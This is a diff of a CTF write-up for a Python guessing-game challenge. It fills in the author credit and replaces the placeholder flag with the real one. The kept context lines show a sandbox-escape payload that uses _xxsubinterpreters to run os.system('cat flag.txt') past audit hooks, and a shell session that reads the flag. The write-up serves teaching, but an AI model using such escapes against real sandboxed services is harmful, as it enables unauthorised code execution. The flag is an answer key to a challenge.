@@ -3,9 +3,9 @@
 Categories: Misc
 
 Description:
-> ???
+> I heard someone say you are a super guess hacker!Let's play my game and got flag!
 > 
->author: ??
+>author: crazyman @ r3kapig
 >
 >[chal](src/service.py)
 
@@ -506,16 +506,14 @@ Hello World!
 $ ls
 flag.txt  service.py
 $ cat flag.txt
-flag{dummy}
+flag{c0ool_y0u_ArE_aN_SuPer_GuE33eR_M@n!}
 $ exit
 Guess game end!!!
 ```
 
 And we leaked the flag!
 
-`flag{dummy}`
-
-
+`flag{c0ool_y0u_ArE_aN_SuPer_GuE33eR_M@n!}`
 
 --------------------
 
@@ -654,11 +652,11 @@ As we can see, it works! Let's use this approach and throw our payload to the re
 Welcome to my guesser game!
 Can u guess the number? between 1 and 9999999999999 >
 __import__('_xxsubinterpreters').run_string(__import__('_xxsubinterpreters').create(), 'import os; os.system("cat flag.txt")', None)
-flag{dummy}
+flag{c0ool_y0u_ArE_aN_SuPer_GuE33eR_M@n!}
 Guess game end!!!
 ```
 
-And we get the flag! `flag{dummy}`
+And we get the flag! `flag{c0ool_y0u_ArE_aN_SuPer_GuE33eR_M@n!}`
 
 ### Using `_posixsubprocess`
 
@@ -748,9 +746,9 @@ Raised event: open
 Evaluated data:
 45352
 Guess game end!!!
-flag{dummy}
+flag{c0ool_y0u_ArE_aN_SuPer_GuE33eR_M@n!}
 ```
 
 As we cam see, no bad events are raised as the imported modules were already previously imported. And we successfully manage to dump the flag!
 
-`flag{dummy}`
+`flag{c0ool_y0u_ArE_aN_SuPer_GuE33eR_M@n!}`
